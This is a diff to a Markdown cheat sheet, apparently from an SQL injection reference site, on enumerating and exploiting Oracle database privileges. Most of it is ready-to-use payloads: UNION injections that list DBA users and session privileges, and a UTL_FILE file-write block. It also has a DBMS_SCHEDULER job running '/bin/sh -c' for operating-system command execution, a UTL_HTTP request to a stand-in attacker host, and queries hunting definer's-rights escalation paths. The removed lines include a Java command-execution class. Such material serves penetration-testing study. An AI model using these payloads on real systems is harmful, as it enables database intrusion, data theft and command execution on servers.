@@ -4,159 +4,144 @@ description: Analyzing and exploiting Oracle database privileges in SQL injectio
 category: Information Gathering
 order: 12
 tags: ["privileges", "escalation", "administration", "security"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
-Oracle implements a sophisticated privilege system to control access to database objects and functionality. Understanding and enumerating privileges is crucial for advanced SQL injection attacks, as they determine what actions can be performed within the database.
+The privileges of the database account behind an injectable query decide what an attacker can read and do. Oracle has four kinds:
 
-## Privilege Types in Oracle
+| Privilege Type    | Description                                     | Examples                                            | Where to look                                      |
+| ----------------- | ----------------------------------------------- | --------------------------------------------------- | -------------------------------------------------- |
+| System privileges | Database-wide actions                           | `CREATE SESSION`, `CREATE ANY TABLE`, `CREATE JOB`  | `SESSION_PRIVS`, `USER_SYS_PRIVS`                  |
+| Object privileges | Access to one object, including PL/SQL packages | `SELECT` on a table, `EXECUTE` on `UTL_FILE`        | `USER_TAB_PRIVS`, `ALL_TAB_PRIVS`                  |
+| Roles             | Named groups of privileges                      | `DBA`, `CONNECT`, `RESOURCE`, `SELECT_CATALOG_ROLE` | `USER_ROLE_PRIVS`, `SESSION_ROLES`                 |
+| Administrative    | Connections as `SYSDBA`, `SYSOPER` and similar  | `SYSDBA`                                            | `SYS_CONTEXT('USERENV','ISDBA')`, `V$PWFILE_USERS` |
 
-Oracle has several types of privileges:
-
-| Privilege Type        | Description                                  | Examples                                       |
-| --------------------- | -------------------------------------------- | ---------------------------------------------- |
-| System Privileges     | Control of database-wide actions             | CREATE SESSION, CREATE TABLE, CREATE ANY TABLE |
-| Object Privileges     | Access to specific database objects          | SELECT, INSERT, UPDATE, DELETE on tables       |
-| Role-Based Privileges | Collection of privileges assigned as a group | DBA, CONNECT, RESOURCE roles                   |
-| Code-Based Privileges | Permission to execute procedures             | EXECUTE on packages like UTL_FILE              |
+`EXECUTE` on a package is an object privilege, and many are granted to `PUBLIC` rather than to the user: look for them in `ALL_TAB_PRIVS` with `grantee = 'PUBLIC'`.
 
 ## Enumerating Current Privileges
 
+Any user can read these views:
+
 ```sql
--- Current user's privileges
-SELECT * FROM USER_SYS_PRIVS
+-- Every system privilege active in the session, including those from roles
+SELECT * FROM SESSION_PRIVS
 
--- Current user's role privileges
+-- Roles granted directly, and roles enabled in the session
 SELECT * FROM USER_ROLE_PRIVS
-
--- Current user's granted roles
 SELECT * FROM SESSION_ROLES
 
--- Current user's object privileges
-SELECT * FROM USER_TAB_PRIVS
+-- Object privileges granted to the user or to PUBLIC on interesting packages
+SELECT table_name, privilege, grantee FROM ALL_TAB_PRIVS
+WHERE table_name IN ('UTL_FILE','UTL_HTTP','DBMS_SCHEDULER','DBMS_JAVA') AND grantee IN ('PUBLIC', USER)
 ```
 
 ## SQL Injection Examples
 
+The UNION examples assume a string injection point in a query returning two string columns.
+
 ### Checking Admin Access
 
 ```sql
--- Check if current user has DBA role
-' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_ROLE_PRIVS WHERE GRANTED_ROLE='DBA') THEN 'DBA ROLE FOUND' ELSE 'NO DBA' END, NULL FROM DUAL--
+-- Has the user the DBA role?
+' UNION SELECT CASE WHEN EXISTS (SELECT 1 FROM USER_ROLE_PRIVS WHERE GRANTED_ROLE='DBA') THEN 'DBA' ELSE 'NO DBA' END, NULL FROM dual--
 
--- Check for system administrator privileges
-' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='SYSDBA') THEN 'SYSDBA FOUND' ELSE 'NO SYSDBA' END, NULL FROM DUAL--
+-- Is the session connected AS SYSDBA? (SYSDBA is not a system privilege, so it is not in USER_SYS_PRIVS)
+' UNION SELECT SYS_CONTEXT('USERENV','ISDBA'), NULL FROM dual--
+
+-- Session privileges, one row each
+' UNION SELECT PRIVILEGE, NULL FROM SESSION_PRIVS--
 ```
 
 ### Enumerating All Users' Privileges
 
-```sql
--- List all privileged users (requires elevated privileges)
-' UNION SELECT USERNAME || ' - ' || PRIVILEGE, NULL FROM DBA_SYS_PRIVS--
+The `DBA_` views need the `DBA` role or `SELECT_CATALOG_ROLE`. Their user column is `GRANTEE`:
 
--- Find users with admin privileges
-' UNION SELECT USERNAME, NULL FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE='DBA'--
+```sql
+' UNION SELECT GRANTEE || ' - ' || PRIVILEGE, NULL FROM DBA_SYS_PRIVS--
+
+-- Who has the DBA role?
+' UNION SELECT GRANTEE, NULL FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE='DBA'--
+
+-- Accounts allowed to connect AS SYSDBA
+' UNION SELECT USERNAME, NULL FROM V$PWFILE_USERS--
 ```
 
 ## Exploiting Powerful Privileges
 
+The packages below are called from PL/SQL. A SQL injection inside a `SELECT` cannot run a PL/SQL block (`' BEGIN ... END;--` is a syntax error there), so these snippets apply when the injection point is itself PL/SQL, for example input concatenated into `EXECUTE IMMEDIATE 'BEGIN ... END;'`, or after gaining a direct connection.
+
 ### File System Access
 
-If UTL_FILE privilege is available:
+`UTL_FILE` works on directory objects (`ALL_DIRECTORIES`), not arbitrary paths, and needs `READ`/`WRITE` on the directory. `GET_LINE` and `PUT_LINE` are procedures, so files cannot be read with a plain `SELECT`.
 
 ```sql
--- Check for UTL_FILE privilege
-' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='EXECUTE ANY PROCEDURE' OR PRIVILEGE='EXECUTE ON UTL_FILE') THEN 'UTL_FILE ACCESSIBLE' ELSE 'NO UTL_FILE' END, NULL FROM DUAL--
+-- Which directory objects can the user see?
+SELECT directory_name, directory_path FROM ALL_DIRECTORIES
+```
 
--- Read file
-' UNION SELECT UTL_FILE.GET_LINE('DIRECTORY', 'file.txt',1), NULL FROM DUAL--
-
--- Write file
-' BEGIN DECLARE FH UTL_FILE.FILE_TYPE; BEGIN FH := UTL_FILE.FOPEN('DIRECTORY', 'output.txt', 'w'); UTL_FILE.PUT_LINE(FH, 'content'); UTL_FILE.FCLOSE(FH); END; END;--
+```sql
+-- Write a file (PL/SQL)
+DECLARE
+  fh UTL_FILE.FILE_TYPE;
+BEGIN
+  fh := UTL_FILE.FOPEN('DATA_PUMP_DIR', 'output.txt', 'w');
+  UTL_FILE.PUT_LINE(fh, 'content');
+  UTL_FILE.FCLOSE(fh);
+END;
 ```
 
 ### Network Access
 
-If UTL_TCP, UTL_HTTP, or UTL_SMTP privileges are available:
+`EXECUTE` on `UTL_HTTP` is granted to `PUBLIC` on current releases (not on 11g XE), and `UTL_HTTP.REQUEST` is a function, so it can run from a query. Since Oracle 11g it also needs a network ACL entry for the user; without one it fails with `ORA-24247`. See [Out of Band Channeling](/oracle/out-of-band-channeling).
 
 ```sql
--- Check for network access privileges
-' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='EXECUTE ON UTL_HTTP') THEN 'UTL_HTTP ACCESSIBLE' ELSE 'NO UTL_HTTP' END, NULL FROM DUAL--
-
--- Make HTTP request
-' UNION SELECT UTL_HTTP.REQUEST('http://example.com'), NULL FROM DUAL--
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.example/'), NULL FROM dual--
 ```
 
 ### Command Execution
 
-If DBMS_SCHEDULER privileges exist:
+`DBMS_SCHEDULER` runs operating system programs with job type `EXECUTABLE`. That needs the `CREATE JOB` and `CREATE EXTERNAL JOB` system privileges (both included in `DBA`), and the job runs as the operating system user configured for external jobs. The program receives its arguments directly, without a shell, so redirection needs an explicit shell:
 
 ```sql
--- Check for DBMS_SCHEDULER privilege
-' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='EXECUTE ON DBMS_SCHEDULER') THEN 'DBMS_SCHEDULER ACCESSIBLE' ELSE 'NO SCHEDULER' END, NULL FROM DUAL--
+-- PL/SQL: run "id > /tmp/out.txt" on a Unix host (use cmd.exe and /c on Windows)
+BEGIN
+  DBMS_SCHEDULER.CREATE_JOB(job_name => 'CMD_JOB', job_type => 'EXECUTABLE',
+    job_action => '/bin/sh', number_of_arguments => 2, enabled => FALSE, auto_drop => TRUE);
+  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB', 1, '-c');
+  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB', 2, 'id > /tmp/out.txt');
+  DBMS_SCHEDULER.ENABLE('CMD_JOB');
+END;
+```
 
--- Execute OS command (Windows example)
-' BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'CMD_JOB', job_type => 'EXECUTABLE', job_action => 'cmd.exe', number_of_arguments => 3, start_date => SYSDATE, enabled => FALSE, auto_drop => TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB',1,'/c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB',2,'dir'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB',3,'> c:\temp\output.txt'); DBMS_SCHEDULER.ENABLE('CMD_JOB'); END;--
+### Java in the Database
+
+Java stored procedures can also run operating system commands, but only when the Oracle JVM is installed (it is not in every edition or image) and the user has been granted Java permissions such as `JAVASYSPRIV` or a `java.io.FilePermission` through `DBMS_JAVA.GRANT_PERMISSION`. `CREATE PROCEDURE` alone is not enough.
+
+```sql
+-- Is the JVM installed? (0 means no Java classes)
+' UNION SELECT TO_CHAR(COUNT(*)), NULL FROM ALL_OBJECTS WHERE OBJECT_TYPE LIKE 'JAVA%'--
 ```
 
 ## Privilege Escalation
 
 ### Finding PL/SQL Injection Points
 
-```sql
--- Enumerate definer rights procedures
-' UNION SELECT OWNER || '.' || OBJECT_NAME, OBJECT_TYPE FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('PROCEDURE', 'FUNCTION', 'PACKAGE') AND OWNER != 'SYS'--
+Definer's rights code runs with its owner's privileges, so a PL/SQL injection in a definer's rights procedure owned by a more privileged user is an escalation path:
 
--- Find vulnerable packages
-' UNION SELECT TEXT, NULL FROM ALL_SOURCE WHERE TYPE='PACKAGE BODY' AND TEXT LIKE '%EXECUTE IMMEDIATE%'--
+```sql
+-- Definer's rights procedures and packages outside Oracle-maintained schemas (12.1.0.2+)
+' UNION SELECT OWNER || '.' || OBJECT_NAME, OBJECT_TYPE FROM ALL_PROCEDURES WHERE AUTHID='DEFINER' AND OWNER NOT IN (SELECT USERNAME FROM ALL_USERS WHERE ORACLE_MAINTAINED='Y')--
+
+-- Code that builds dynamic SQL
+' UNION SELECT OWNER || '.' || NAME, TEXT FROM ALL_SOURCE WHERE UPPER(TEXT) LIKE '%EXECUTE IMMEDIATE%'--
 ```
 
-### Exploiting Java in the Database
+### Privileges Inherited Through Roles
 
 ```sql
--- Check for Java privileges
-' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='CREATE PROCEDURE' OR PRIVILEGE='CREATE ANY PROCEDURE') THEN 'CAN CREATE JAVA' ELSE 'NO JAVA PRIV' END, NULL FROM DUAL--
-
--- Create and execute Java (example)
-' BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Shell" AS import java.io.*; public class Shell { public static String execute(String cmd) throws Exception { BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream())); StringBuffer sb = new StringBuffer(); String line; while((line=br.readLine()) != null) sb.append(line).append("\n"); return sb.toString(); } }'; END;--
-```
-
-## Dictionary Views for Privilege Analysis
-
-```sql
--- List available dictionary views
-' UNION SELECT TABLE_NAME, COMMENTS FROM DICTIONARY WHERE TABLE_NAME LIKE '%PRIV%'--
-
--- Check specific privilege for current user
-' UNION SELECT PRIVILEGE, 'YES' FROM USER_SYS_PRIVS WHERE PRIVILEGE='CREATE ANY TABLE'--
-```
-
-## Session Privileges
-
-```sql
--- Check current session privileges
-' UNION SELECT SYS_CONTEXT('USERENV', 'CURRENT_USER') || ' - ' || SYS_CONTEXT('USERENV', 'ISDBA'), NULL FROM DUAL--
-
--- List enabled roles
-' UNION SELECT ROLE, NULL FROM SESSION_ROLES--
-```
-
-## Privilege-Restricted Functions
-
-```sql
--- Test access to restricted functions
-' UNION SELECT DBMS_STATS.GET_PARAM('STALE_PERCENT'), NULL FROM DUAL--
-
--- Test execute permissions on sys objects
-' BEGIN SYS.KUPW$WORKER.MAIN('x','x','x','x'); END;--
-```
-
-## Mitigating Privilege Constraints
-
-```sql
--- Find alternate accessible packages
-' UNION SELECT DISTINCT OWNER || '.' || NAME, TYPE FROM ALL_SOURCE WHERE TYPE='PACKAGE' AND OWNER NOT IN ('SYS','SYSTEM','CTXSYS')--
-
--- Find indirect privilege paths
+-- System privileges of the roles granted to the current user (needs DBA_SYS_PRIVS access)
 ' UNION SELECT GRANTEE, PRIVILEGE FROM DBA_SYS_PRIVS WHERE GRANTEE IN (SELECT GRANTED_ROLE FROM USER_ROLE_PRIVS)--
+
+-- Privilege-related dictionary views
+' UNION SELECT TABLE_NAME, COMMENTS FROM DICTIONARY WHERE TABLE_NAME LIKE '%PRIV%'--
 ```
